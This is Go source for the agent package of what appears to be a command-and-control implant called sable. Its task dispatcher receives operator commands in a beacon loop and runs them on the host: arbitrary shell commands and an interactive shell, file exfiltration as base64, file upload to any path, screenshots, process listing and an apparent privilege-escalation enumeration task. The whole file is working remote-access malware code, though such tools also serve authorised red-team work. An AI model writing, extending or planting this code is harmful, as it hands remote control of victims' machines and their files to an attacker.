package agent

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strings"
	"sync/atomic"
	"time"

	"github.com/aelder202/sable/internal/protocol"
)

const (
	shellTimeout          = 60 * time.Second
	maxShellOutputBytes   = 512 * 1024       // 512 KB
	maxDownloadBytes      = 50 * 1024 * 1024 // 50 MB
	maxUploadBytes        = 50 * 1024 * 1024 // 50 MB
	downloadProgressEvery = 30 * time.Second
)

// ptyShell is the persistent shell session used during interactive mode.
// It is lazily started on the first shell command and torn down on "interactive stop".
var ptyShell persistentShell

// executeTask dispatches a task to the appropriate handler and returns the result.
func executeTask(t *protocol.Task) *protocol.TaskResult {
	var output, taskErr string

	switch t.Type {
	case "shell":
		if atomic.LoadInt32(&interactiveMode) == 1 {
			// Use the persistent shell so cwd and environment persist across commands.
			output, taskErr = ptyShell.exec(t.Payload)
		} else {
			output, taskErr = runShell(t.Payload)
		}
	case "download":
		return startDownloadTask(t.ID, t.Payload)
	case "ps":
		output, taskErr = listProcesses()
	case "screenshot":
		output, taskErr = captureScreenshot()
	case "persistence":
		output, taskErr = detectPersistence()
	case "peas":
		return startPEASTask(t.ID)
	case "snapshot":
		output, taskErr = hostSnapshot()
	case "ls":
		output, taskErr = listDirectory(t.Payload)
	case "cancel":
		output, taskErr = cancelBackgroundTask(t.Payload)
	case "complete":
		extendPathBrowseFastWindow()
		output, taskErr = completePath(t.Payload)
	case "pathbrowse":
		if t.Payload == "start" {
			extendPathBrowseFastWindow()
			output = "path browser ready"
		} else {
			stopPathBrowseFastWindow()
			output = "path browser stopped"
		}
	case "upload":
		output, taskErr = uploadFile(t.Payload)
	case "interactive":
		if t.Payload == "start" {
			atomic.StoreInt32(&interactiveMode, 1)
			output = "interactive mode started"
		} else {
			atomic.StoreInt32(&interactiveMode, 0)
			ptyShell.close()
			output = "interactive mode stopped"
		}
	case "sleep":
		// sleep is handled in the beacon loop before executeTask is called
		output = "sleep acknowledged"
	case "kill":
		// kill causes the beacon loop to return after executeTask
		output = "terminating"
	default:
		taskErr = fmt.Sprintf("unknown task type: %q", t.Type)
	}

	return &protocol.TaskResult{TaskID: t.ID, Type: t.Type, Output: output, Error: taskErr}
}

type pathCompletionResult struct {
	Input  string   `json:"input"`
	Common string   `json:"common"`
	Items  []string `json:"items"`
	More   bool     `json:"more"`
}

// runShell executes a shell command and returns combined stdout/stderr.
// A 60-second deadline prevents runaway processes from blocking the beacon loop.
// Output is capped at maxShellOutputBytes to bound memory use.
func runShell(cmd string) (string, string) {
	var shell, flag string
	if runtime.GOOS == "windows" {
		shell, flag = "cmd", "/C"
	} else {
		shell, flag = "/bin/sh", "-c"
	}
	ctx, cancel := context.WithTimeout(context.Background(), shellTimeout)
	defer cancel()
	out, err := exec.CommandContext(ctx, shell, flag, cmd).CombinedOutput()
	if len(out) > maxShellOutputBytes {
		out = out[:maxShellOutputBytes]
	}
	if err != nil {
		return string(out), err.Error()
	}
	return string(out), ""
}

func startDownloadTask(taskID, path string) *protocol.TaskResult {
	atomic.AddInt32(&backgroundTaskCount, 1)
	ctx, cancel := context.WithCancel(context.Background())
	backgroundTasks.Store(taskID, cancel)
	go func() {
		defer backgroundTasks.Delete(taskID)
		defer atomic.AddInt32(&backgroundTaskCount, -1)
		output, taskErr := downloadFileWithProgress(ctx, path, func(message string) {
			queueAsyncTypedProgress(taskID, "download_progress", "download", message)
		})
		queueAsyncResult(&protocol.TaskResult{TaskID: taskID, Type: "download", Output: output, Error: taskErr})
	}()

	return &protocol.TaskResult{
		TaskID: taskID + "-download-started",
		Type:   "download_progress",
		Output: "[download] reading " + path,
	}
}

func downloadFile(path string) (string, string) {
	return downloadFileWithProgress(context.Background(), path, nil)
}

// downloadFileWithProgress reads a file from the agent filesystem and returns
// its base64-encoded contents. Files larger than maxDownloadBytes are rejected
// to prevent memory exhaustion.
func downloadFileWithProgress(ctx context.Context, path string, progress func(string)) (string, string) {
	info, err := os.Stat(path)
	if err != nil {
		return "", err.Error()
	}
	if info.IsDir() {
		return "", "is a directory"
	}
	if info.Size() > maxDownloadBytes {
		return "", fmt.Sprintf("file too large: %d bytes (max %d)", info.Size(), maxDownloadBytes)
	}
	file, err := os.Open(path)
	if err != nil {
		return "", err.Error()
	}
	defer file.Close() //nolint:errcheck

	var buf bytes.Buffer
	if info.Size() > 0 {
		buf.Grow(int(info.Size()))
	}
	tmp := make([]byte, 256*1024)
	var read int64
	lastProgress := time.Now()
	for {
		if err := ctx.Err(); err != nil {
			return "", "download cancelled"
		}
		n, err := file.Read(tmp)
		if n > 0 {
			read += int64(n)
			buf.Write(tmp[:n]) //nolint:errcheck
			if progress != nil && time.Since(lastProgress) >= downloadProgressEvery {
				progress(fmt.Sprintf("[download] read %s of %s from %s", formatByteCount(read), formatByteCount(info.Size()), path))
				lastProgress = time.Now()
			}
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			return "", err.Error()
		}
	}
	if progress != nil {
		progress(fmt.Sprintf("[download] read complete: %s from %s", formatByteCount(read), path))
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes()), ""
}

func formatByteCount(value int64) string {
	const unit = 1024
	if value < unit {
		return fmt.Sprintf("%d B", value)
	}
	div, exp := int64(unit), 0
	for n := value / unit; n >= unit && exp < 4; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(value)/float64(div), "KMGTPE"[exp])
}

func completePath(input string) (string, string) {
	input = strings.TrimSpace(input)
	dir, prefix := splitCompletionInput(input)
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "", err.Error()
	}

	var items []string
	for _, entry := range entries {
		name := entry.Name()
		if !strings.HasPrefix(name, prefix) {
			continue
		}
		item := joinCompletionPath(dir, name, entry.IsDir())
		items = append(items, item)
	}
	sort.Strings(items)

	result := pathCompletionResult{
		Input:  input,
		Common: longestCommonPrefix(items),
		Items:  items,
	}
	encoded, err := json.Marshal(result)
	if err != nil {
		return "", err.Error()
	}
	return string(encoded), ""
}

func splitCompletionInput(input string) (string, string) {
	if input == "" {
		return ".", ""
	}
	idx := strings.LastIndexAny(input, `/\`)
	if idx < 0 {
		return ".", input
	}
	dir := input[:idx+1]
	prefix := input[idx+1:]
	if dir == "" {
		dir = "."
	}
	return dir, prefix
}

func joinCompletionPath(dir, name string, isDir bool) string {
	if dir == "." {
		dir = ""
	}
	path := dir + name
	if isDir && !strings.HasSuffix(path, "/") && !strings.HasSuffix(path, `\`) {
		if strings.Contains(dir, `\`) {
			path += `\`
		} else {
			path += "/"
		}
	}
	return path
}

func longestCommonPrefix(items []string) string {
	if len(items) == 0 {
		return ""
	}
	prefix := items[0]
	for _, item := range items[1:] {
		for !strings.HasPrefix(item, prefix) {
			if prefix == "" {
				return ""
			}
			prefix = prefix[:len(prefix)-1]
		}
	}
	return prefix
}

// uploadFile writes base64-encoded data to a path on the agent filesystem.
// Payload format: "path:base64data"
func uploadFile(payload string) (string, string) {
	// LastIndexByte finds the separator between path and base64 data.
	// Base64 never contains ':', so the last ':' is always the delimiter.
	// This correctly handles Windows paths such as "C:\path\file.txt:data".
	idx := strings.LastIndexByte(payload, ':')
	if idx < 0 {
		return "", "invalid upload payload: missing ':' separator"
	}
	path := payload[:idx]
	b64data := payload[idx+1:]
	if len(b64data) > base64.StdEncoding.EncodedLen(maxUploadBytes) {
		return "", fmt.Sprintf("upload data too large: max %d bytes", maxUploadBytes)
	}
	data, err := base64.StdEncoding.DecodeString(b64data)
	if err != nil {
		return "", fmt.Sprintf("base64 decode failed: %v", err)
	}
	if len(data) > maxUploadBytes {
		return "", fmt.Sprintf("upload data too large: %d bytes (max %d)", len(data), maxUploadBytes)
	}
	if err := os.WriteFile(path, data, 0600); err != nil {
		return "", err.Error()
	}
	return fmt.Sprintf("wrote %d bytes to %s", len(data), path), ""
}
